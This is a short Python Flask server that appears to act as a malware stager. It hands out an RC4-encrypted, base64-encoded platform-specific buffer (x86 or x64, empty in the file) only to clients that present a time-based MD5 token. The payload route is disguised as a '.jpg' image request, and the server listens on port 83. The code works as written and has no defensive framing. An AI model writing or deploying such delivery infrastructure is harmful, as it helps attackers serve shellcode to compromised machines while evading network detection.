# coding:utf-8
from arc4 import ARC4
import base64
import time
from flask import *
import hashlib

import random
import string
app = Flask(__name__)
buf_x64 = b""
buf_x86 = b""
obs = "asdasjasdnlkasdj[psgdakn[jF*("
keys = [int(time.time()), ''.join(random.sample(string.ascii_letters + string.digits, 32))]


@app.route('/<key>')
def Center(key):
    if(request.headers["Accept-platform"] == "x86"):
        buf = buf_x86
    else:
        buf = buf_x64

    t = time.time()
    t = int(int(t) / 100)
    hl = hashlib.md5()
    hl.update((obs + str(t)).encode(encoding='utf-8'))
    md5 = hl.hexdigest()
    if key == md5:
        global keys
        print(int(time.time()), keys[0])
        if int(time.time()) - keys[0] >= 10:
            salt = ''.join(random.sample(string.ascii_letters + string.digits, 32))
            print(salt)
            keys[1] = salt
            keys[0] = int(time.time())
        print(keys)
        return keys[1]
    elif key == str(int(int(time.time()) / 100)) + ".jpg":

        arc4 = ARC4(keys[1])

        enc = arc4.encrypt(buf)
        b64 = base64.b64encode(enc)
        arc3 = ARC4(keys[1])
        dec = arc3.decrypt(enc)
        return b64.decode()
    return "nothing"


@app.route("/my/get_size")
def size():
    if(request.headers["Accept-platform"] == "x86"):
        buf = buf_x86
    else:
        buf = buf_x64

    return str(len(buf))


#encrypted = encrypt(buf, key)
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=83)
